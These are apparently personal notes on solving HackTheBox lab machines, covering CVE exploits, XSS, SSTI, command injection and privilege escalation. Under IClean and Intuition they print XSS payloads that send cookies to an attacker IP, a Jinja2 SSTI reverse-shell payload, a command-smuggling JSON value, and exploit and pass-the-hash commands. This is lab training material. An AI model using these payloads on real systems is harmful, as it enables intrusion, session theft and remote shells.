# HTB-Bizness
- Linux
- Apache Ofbiz Exploit, SSRF to RCE  
Link: https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
- PrivEsc:
1.  Has stored credentials hash in local files. Refer any HTB-Bizness writeup.
2.  Refer to reverse the encoding changes made by base64.urlsafe_b64encode() function and eventually using hashcat for cracking.  
Link: https://www.linkedin.com/pulse/bizness-htb-walkthrough-laith-younes-laith-younes--jtqhe?trk=article-ssr-frontend-pulse_more-articles_related-content-card

# HTB-Devvortex
- Linux
- My writeup available on medium.
- Joomla Unauthenticated information disclosure (CVE-2023-23752)
- Joomla CMS reverseshell by setting custom templates. Refer the writeup.
- Mysql database hash found.
- `sudo -l` => `/usr/bin/apport-cli` (CVE-2023-1326)

# HTB-Surveillance
- Linux
- Found a SQL database file with some hash and successfully cracked which was also the SSH password.
- `Craft CMS RCE`,  
Link: https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce
- Found internally running `ZoneFinder`. So, tunnelled to our local port with SSH.  
`ZoneFinder RCE`,  
Link: https://github.com/rvizx/CVE-2023-26035
- `zmupdate.pl` for privesc. But database password required and the output of command is not shown directly. So, we can pipe the output to any file from the root shell and then refer it from anywhere i.e. other user accounts.  
Link: https://maskirovka23.medium.com/i-just-solved-the-box-using-following-command-a11a49193d74

# HTB-TwoMillion
- Linux
- My writeup available on medium.
- API Testing
- Command Injection
- Kernal Version < 6.2(`uname -a`), then OverlayFS / FUSE exploit `CVE-2023-0386`,  
Link: https://github.com/xkaneiki/CVE-2023-0386/

# HTB-Monitored
- Linux
- My writeup available on medium.
- API Testing. Revealing sensitive endpoints with API documentations.
- Nagiosxi Interface RCE (Need Admin privilege account.)
- Writable executable which is being called by a service. We can execute a custom 'manage_service.sh' script(`sudo -l`) with sudo privileges. So, replaced the calling executable with malicious reverse shell.(`msfvenom`) And finally restarting the service.

# HTB-Perfection
- Linux
- My writeup available on medium.
- SSTI to RCE.
- Hash Cracking using a hint from the `mail`.

# HTB-Headless
- Stored XSS in User Agent field and leveraged it for admin cookie hijacking.
- Command Injection on the dashboard in the admin session.
- sudo permission on `syscheck` script that was misconfigured to look for a `initdb.sh` file in the current working directory. So, made the same named reverseshell script, gave execute permission and again ran the `syscheck` script with sudo permissions.

# HTB-WifineticTwo
- Got default credentials `openplc:openplc` and used the below script. This below script had only one change compared to the original OpenPLC exploit PoC where we need to specify one of the `.st` files that already exists on the server like `blank_program.st`.
Refer: https://github.com/Hunt3r0x/CVE-2021-31630-HTB/blob/main/exploit.py
- Now did some wifi pentesting and found one wifi network with WPS enabled. So, bruteforced WPS code(PixieDustAttack), got the credentials and connected.
- Now connected but didn't get any IP assigned, so did manually and finally performed a ping sweep to locate more hosts on the same wifi network. And finally did an ssh without any credentials.

# HTB-PoV
- Windows
- Refer: https://techyrick.com/pov-hackthebox-writeup/
- Got to learn about the `web.config` file that contains some decryption sensitive keys.
- ASP.NET Deserialization.(Refer the Obsidian HTB-PoV notes to get the serialized payload)
Refer: https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/
- Learnt about saved password extraction using `GetNetworkCredential().Password`.
Refer: https://adamtheautomator.com/powershell-get-credential/
- Learnt about the `RunasCs.exe` executable to get a reverseshell once we have credentials.
`.\RunasCs.exe _user_ _pass_ cmd.exe -r _tun0IP_:_PORT_` => **Note:** We were able to escalate our privileges using this only. By manually connecting using `Invoke-Command` we were unable to do so.
- Finally had `SeDebugPrivilege`. So, enabled with `psgetsys.ps1` and `EnableAllTokenPrivs.ps1` scripts.
- Now used this privilege to create a metasploit payload and finally migrated to NT Authority-System processes like `lsass.exe` using the meterpreter shell.

# HTB-Builder
- Linux
- My writeup available on medium.
- Jenkins System file read. (CVE-2024-23897)
Link: https://blog.securelayer7.net/arbitrary-file-read-in-jenkins/
>- `wget http://<target_ip>:8080/jnlpJars/jenkins-cli.jar` => Download jar file.
>- `java -jar jenkins-cli.jar -s http://<target_ip>:8080/ connect-node @/etc/passwd` => Read system files.
- Environment variables file to locate the webroot location.
`/proc/self/environ`
- Learnt to perform **jenkins decryption** using the Groovy command. Refer https://devops.stackexchange.com/questions/2191/how-to-decrypt-jenkins-passwords-from-credentials-xml

# HTB-IClean
- Linux
- XSS cookie steal,
`<iframe src="javascript:document.location='http://IP/index.php?c='+document.cookie;">`
from the `/sendMessage` POST page in argument `service=_XSSPayload_&email=a@d.com`
So, got the `/dashboard` page cookie.
- Now the `/QRGenerator` page is vulnerable to SSTI in the `invoice_id=&form_type=scannable_invoice&qr_link=_SSTIPayload_` POST parameter. So, used the payload `{{7*7}}` and finally found it be `jinja2`.
So, the reverseshell payload used,
`{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}`
- Now got database credential from webserver file and then found credential hashes. So, cracked it and did ssh.
- `sudo -l` => `/usr/bin/qpdf` => `sudo /usr/bin/qpdf --add-attachment /root/root.txt -- dummy.pdf newdum.pdf`
(Where `dummy.pdf` is any inout pdf file and `newdum.pdf` is the output pdf file with the attachment)
- `sudo /usr/bin/qpdf --list-attachments newdum.pdf` => List attachments names.
- `sudo /usr/bin/qpdf --show-attachment=root.txt -- newdum.pdf` => See the contents of an attachment.

# HTB-Usage
- Linux
- SQL Injection on the email parameter of the forgotpassword POST request page.
So, used `sqlmap` with `--level=5 --risk=3`. And extracted the `admin` user password.
- Now logged into the laravel-admin interface and found a profile image upload option.
So, used that to execute php reverseshell.
Link: https://flyd.uk/post/cve-2023-24249/
- Now located credential of `xander` user in a hidden file.
- Privilege escalation => `sudo -l` => `/usr/bin/usage_management` i.e. a custom binary. So, downloaded on the system and opened with `ghidra` and found `7za` being called with a wildcard like `7za a /backup/$filename.zip -t7z -snl -p$pass -- *`.
Refer: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks

# HTB-Runner
- Linux
- My writeup available on medium.
- Used `Cewl` to generate a wordlist.
So, now used gobuster to find a new subdomain `teamcity`.
- So, searched an exploit for `teamcity`. Refer https://github.com/Chocapikk/CVE-2024-27198/blob/main/exploit.py
So, this created an admin user with this exploit and enumerated on the admin dashboard to locate a backup zip file.
- Now in the zip file found some hashes and also a SSH private key. So, now got logged in.
- Now with linpeas found a new subdomain in the `/etc/hosts` file mapping. So, got this added and found a `portrainer` login page. So, now used one of the hash cracked user credential and got access.
- Now refer the writeup to perform a Portrainer docker escape deployment technique.
Link: https://rioasmara.com/2021/08/15/use-portainer-for-privilege-escalation/
```
device: /
o: bind
type: none
```
These are the volume driver options to setup for the root path, if the version is latest.

# HTB-Napper
- Windows

# HTB-Intuition
- Linux
- Found a bug reporting functionality which is inspected by the staff. Now got an account registered. So, was vulnerable to XSS and hence, got the cookie.
```
<img src=x onerror="fetch('http://10.10.14.148:3000/index.php?c='+document.cookie)">
```
Now found some more subdomains. And hence, got logged in as the WebDev staff with the attained cookie.
- Now the Admin staff was responsible for looking into higher priority bugs, and hence, again reported the same XSS payload and set the priority to 1 and got the Admin cookie as well and logged in as this user.
- So, now this Admin account got a PDF generation functionality from a URL and hence, tested it by hosting a file on tun0 and now we noticed the `User-Agent: Python-urllib3...` on the request we got and found `CVE-2023-24329`.
- This CVE states we can bypass any blacklisted schemes like `file://`, `ftp://`, etc. by simply adding a leading space character as ` file:///etc/passwd` and hence, it works.
- Now found the root directory where the Flask application is running with `/proc/self/environ` and `/proc/self/cmdline`.
- Now going through the `app.py` file, we located the other custom implemented modules and withing `/app/code/blueprints/dashboard/dashboard.py` located `ftp` credential.
- Now using the same bypass technique CVE above, we listed the FTP files as,
` ftp://ftp_admin:u3jai8y71s2@ftp.local`
and downloaded the files as,
```
 ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt
 ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key
```
where we found the encypted SSH private key with its passphrase.
Now got the key decrypted with,
```
chmod 600 id_rsa
ssh-keygen -p -f id_rsa
```
And found a comment which stated the username `dev_acc`. And hence, finally got SSH access and got the `user.txt`.
- Now for privesc, found a `user.db` file in the Flask app directory and got the hash and got it cracked. `adam:adam gray`
Also found port 21 open locally and hence, did ftp login and located some `runner1` backup files and how it is implemented. And also used hashcat to crack the remaining part of the auth code with,
`hashcat -m 0 -a 3 -1 ?d?u hash.txt UHI75GHI?1?1?1?1`
- Now from the logs in `/var/logs/suricata` located `lopez` user credentials with,
`zgrep -i "lopez" *.gz`
which tries to locate every line with the user `lopez` string within the compressed gzip files. And here we found this user logging in with FTP credentials and we tries SSH access and got success.
- Now `sudo -l` showed a custom binary named `runner2` which accepts a JSON file. So, revered it with ghidra and found it directly executes with the `system()` function without proper sanitation. So, used chatgpt to get the accepted json file format for this ghidra code. And now used a random tar file and named it as `test.tar;bash`. And now the JSON file format looks like,
```
{
	"run":{
					"action":"install"
					"role_path":"test.tar;bash"
	},
	"auth_code":"UHI75GHINKOP"
}
```
- So, now finally we run,
`sudo /opt/..../runner2 tmp.json`
Now the `test.tar` part is an invalid file which throws error but specifically executing the `bash` part as root giving the root shell.

# HTB-Mailing
- Windows
- On the home webpage found a link that had `/download.php?file=....` which probably looks vulnerable to LFI.
- Now once we located the hmailserver software is installed, managed to find the location of the configuration file using ChatGPT=> `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` and located the administrator user hash and cracked it from `crackstation.com`.
- Now located a public exploit, `CVE-2024-21413`,
PoC Link: https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
`python3 CVE-2024-21413.py --server mailing.htb --port 587 --username "administrator@mailing.htb" --password "homenetworkingadministrator" --sender "administrator@mailing.htb" --recipient "maya@mailing.htb" --url "\\10.10.14.62/share" --subject "test"`
We just need to start `responder` and no need to host any smb share. So, when the user maya clicks on the share link, her NTLM hash is recieved as it by default tries to login using her NTLM credentials.
So, got it cracked and got `PowerShell` access using `evilwinrm` and got the user.txt file.
- Now located `libre` with version 7.4 and located a public privilege escalation exploit `CVE-2023-2255`. 
PoC Link: https://github.com/elweth-sec/CVE-2023-2255
`python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'`
So, using this added our user to administrators group and got this `exploit.odt` downloaded on the target and just opened it.
- Now got the NTLM hashes for other users using `CrackMapExec` using maya credentials.
- Now performed pass the hash using,
`impacket-wmiexec localadmin@10.10.11.14 -hashes "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae"`
and got the root.txt.

# HTB-Boardlight
- Linux
- Found `Board.htb` mentioned on the homepage on port 80 and added it to `/etc/hosts`.
- Now running look for subdomains, found `crm.Board.htb` and added that too to `/etc/hosts`.
- Now there found `Dolibarr 17.0.0` where we located an reverseshell authenticated exploit poc. And for default creds we found `admin:admin` and used the poc and default creds to get reverse shell.
- Now located a `conf.php` file where we located the database passwd and tried ssh that to the home user `larissa` using the same passwd and got access.
- Now after running `linpeas.sh`, located a `enlightenment` SUID set binary and eventually found a poc exploit `CVE-2022-37706` and used it to get root shell.
Link: https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit

# HTB-Blurry
- Linux
- My writeup available on Medium.
- Insecure Deserialization in ClearLM platform for initial foothold.
- Pytorch('pth') file to privilege escalation.

# HTB-Editorial
- Linux
- My writeup available on Medium.
- SSRF and found internal API server by fuzzing which had info disclosure vulnerability that allowed to locate sensitive endpoints and one of which had credentials for the first user.
- Now after getting SSH access locate `.git` directory which had sensitive commits.
Go to directory having `.git` folder.
`git log` => Show commits.
`git status _commitID_` => To see the commit made.
So, one of the commits had credentials to another user on system.
- So, this user had sudo privileges on a `python3` script which had a git clone vulnerability due to the `Repo` `clone_from()` method in the `git` module which allowed command injection as root user. So, we made a script to create a bash binary and get SUID set on it and got this script executed due to this exploit.
Link: https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858

# HTB-Lame
- Linux
- For port `3632` found `CVE-2004-2687` poc to get reverseshell,
Link: https://github.com/k4miyo/CVE-2004-2687
- Now for privesc, found SUID set for `nmap`,
```
/usr/bin/nmap --interactive
nmap> !whoami    => On Prompt check for root
nmap> !sh  				=> Get the root shell
```

# HTB-Crafty
- Windows
- We found an uncommon port open and on service scan found it is a minecraft server with version `1.16.5`. Now researching on this version found it is vulnerable to Log4j RCE exploit. So, we just need to host a malicious java class file that spawns a reverse shell with the `ldap` server. So, we got a script to host. And for the client we need to install minecraft. So, `TLauncher` did a great job. So, tried to do all of that manually but the `Exploit.class` file we compiled was not throwing the reverse shell.
- After a while came across a fully automated working PoC. So, we just need to turn on the listener, download the required JDK for the PoC and finally run the PoC and we grabbed the shell and got the first flag.
Link: https://github.com/kozmer/log4j-shell-poc
- Now running `winpeas` couldn't locate anything interesting. Came across a writeup and got to know that these hosted minecraft server `jar` files contains password of the admin user to access the system resources. And hence, downloaded both `server.jar` and `playercounter-1.0-SNAPSHOT.jar` files and decompiled them using `jd-gui` utility and located a password. And hence, finally used `RunasCs.exe` to run commands as other users i.e. admin.

# HTB-Jab
- Windows
- So, while portscan found a service named `xmpp` on one of the ports. Started researching on it and found it a messaging service such that the members can talk in realtime. Now researching on how to connect to this service found a `pidgin` GUI utility and got it downloaded.
- Now got a test account registered. So, enumerating this app found a room discovery plugin and got it installed and found a room named test2 where we located some chats but was useless. Also from the user manage section found another utility to list users. So, used the wildcard character to locate all the user names. And now ran pidgin again in log mode and went through the steps to get the users.
`pidgin -d > out.log`
Finally from this log file got the users and sorted it into a user list.
- Now performed ASReproasing with `impacket-GetNPUsers` using this user list. Found 3 tickets and one of them cracked. And with these gathered creds logged into pidgin and located a `pentest` chat room and got a ticket cracked. So, got another credential for user `svc_openfire`. Couldn't get shell access anyway. So, went through a writeup and got to learn about msrpc and DCOM service for code execution. Hence, we used one of the impacket utility for DCOM remote code execution to get the shell and got the first flag.
`impacket-dcomexec -object MMC20 jab.htb/svc_openfire:'_Passwd_'@10.10.11.4 'cmd.exe /c _revShellCode_' -silentcommand`
- Now we found a openfire privilege escalation vulnerability to access admin panel. So, we found a PoC that tries to add a new user but was of no use to us as we already had `svc_openfire` user passwd. 
Link: https://github.com/miko550/CVE-2023-32315
- So, we confirmed that both `9090` and `9091` ports were open on localhost. Now time was to port forward these two ports onto our attack machine. So, we used `chisel`.
- And hence, we followed rest of the steps on the PoC readme page after the login to upload a custom RCE plugin. And finally got admin shell command access and got the final flag.
